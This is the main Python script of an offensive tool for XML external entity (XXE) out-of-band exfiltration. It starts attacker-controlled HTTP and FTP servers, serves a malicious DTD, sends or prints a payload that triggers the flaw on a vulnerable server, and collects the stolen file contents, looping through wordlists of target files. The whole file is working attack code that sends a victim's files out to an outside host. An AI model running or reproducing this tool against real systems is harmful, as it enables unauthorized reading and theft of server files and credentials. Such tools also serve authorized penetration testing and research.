#!/usr/bin/env python3


import sys
from os.path import isdir
from threading import Thread
from argparse import ArgumentParser

# avoid creating __pycache__ directories before importing local files
sys.dont_write_bytecode = True

from lib.utils import *
from lib.servers import *
from lib.payloads import *


# parse arguments
def parse_args():
	parser = ArgumentParser(description='XXE OOB file content exfiltrator via self-hosted HTTP and FTP servers')

	parser.add_argument('-s', '--server', help='This server IP/hostname', required=True)
	parser.add_argument('-f', '--file', help='File to retrieve in vulnerable server')
	parser.add_argument('-fp', '--ftp-port', help='FTP server port (default: 21)', dest='ftp_port', type=int, default=21)
	parser.add_argument('-hp', '--http-port', help='HTTP server port (default: 80)', dest='http_port', type=int, default=80)
	parser.add_argument('-o', '--outfile', help='Output exfiltrated content to file (or directory in case of multiple files)')
	parser.add_argument('-w', '--wordlist', help='Wordlist containing a list of files to retrieve')
	parser.add_argument('-r', '--requestfile', help='Use JSON request file for automatic mode (to automatically trigger the request to vulnerable server)')
	parser.add_argument('-b', '--base64', help='Convert exfiltrated content from Base64', action='store_const', const=True)

	return parser.parse_args()


# exfiltrate file function, return True or False whether the file has been exfiltrated or not
def exfiltrate(args):
	# init payloads
	dtd = (DTD_BASE64 if args.base64 else DTD)
	dtd = dtd.format(FILE=args.file, ADDR=args.server, PORT=(':{}'.format(args.ftp_port) if args.ftp_port != 21 else ''))
	payload = PAYLOAD.format(ADDR=args.server, PORT=(':{}'.format(args.http_port) if args.http_port != 80 else ''))

	print('[*] Exfiltrating file {}"{}" from vulnerable server'.format(args.progress, args.file))

	# automatic mode with requestfile enabled
	if args.requestfile is not None:
		if args.firsttime:
			# check if it is safe to bind before starting HTTP server thread, if an exception is encountered exit before starting thread
			exc_httpsrv = check_bindport(args.server, args.http_port)
			if exc_httpsrv is not None:
				if not common_bind_exception(exc_httpsrv, args.server, args.http_port):
					print('[X] Exception "{}" encountered while starting HTTP server on port {}\n[-] Exiting'.format(type(exc_httpsrv).__name__, args.http_port))
					exit(1)
		
		# use a thread for starting HTTP server before sending request
		Thread(target=http_server, args=(args.server, args.http_port, dtd, True), daemon=True).start()

		req_parsed = parse_requestfile(args.requestfile, payload)
		print('[*] Sending {} request to "{}" for triggering the vulnerability'.format(req_parsed['method'], req_parsed['url']))

		# send the request asynchronously: do not wait for response, just trigger the XXE vulnerability
		Thread(target=async_request, args=(req_parsed,), daemon=True).start()

	# normal single-threaded mode, the server will wait until request is manually sent by the attacker
	else:
		print('[i] Use this payload to exfiltrate the file:\n\n{}\n'.format(payload))
		http_server(args.server, args.http_port, dtd)

	content = ftp_server(args.server, args.ftp_port)

	if not content:
		print('[-] Could not exfiltrate file "{}"'.format(args.file))
		return False

	print('[+] File "{}" exfiltrated successfully'.format(args.file))

	if args.base64:
		content = convert_base64(content)

	# print exfiltrated file content to stdout
	if args.outfile is None:
		print('[+] Here is the file content:\n\n{}'.format(content))
		return True
	
	# saving exfiltrated file to output file
	outfile = args.outfile

	# directory check
	if isdir(outfile) and not outfile.endswith('/') and not outfile.endswith('\\'):
		outfile += '/'

	# if wordlist provided, append specific filename to avoid overwriting always the same file
	if args.wordlist is not None:
		outfile += '_{}'.format(args.file.replace('/', '_').replace('\\', '_'))

	try:
		with open(outfile, 'w') as output_file:
			output_file.write(content)
	except Exception as e:
		print('[X] Exception "{}" encountered while writing output file on path "{}"\n[-] Exiting'.format(type(e).__name__, outfile))
		exit(1)

	print('[+] Saved its output to file "{}"'.format(outfile))
	return True


def main():
	try:
		print('[+] Started XXE OOB file content exfiltrator')

		args = parse_args()

		# add a variable to args for checking if it is the first run
		args.firsttime = True

		# add another variable to args for checking progress in case of wordlist (ex: file 1/1000)
		args.progress = ''

		# wordlist file not provided, check single file
		if args.wordlist is None:
			if args.file is None:
				print('[X] Error: you must provide a file or a wordlist of files to exfiltrate as arguments\n[-] Exiting')
				exit(1)
			exfiltrate(args)

		# wordlist file provided, parse it and iterate files to exfiltrate from it
		else:
			exfiltrated_counter = 0

			files = parse_wordlist(args.wordlist)
			for i, f in enumerate(files):
				args.progress = '{}/{} '.format(i+1, len(files))
				args.file = f

				if exfiltrate(args):
					exfiltrated_counter += 1

				if args.firsttime:
					args.firsttime = False

				print('')

			print('[+] {} files exfiltrated'.format(exfiltrated_counter))

		print('\n[+] Done')

	except KeyboardInterrupt:
		print('\n[-] Exiting')
		exit(0)


if __name__ == '__main__':
	main()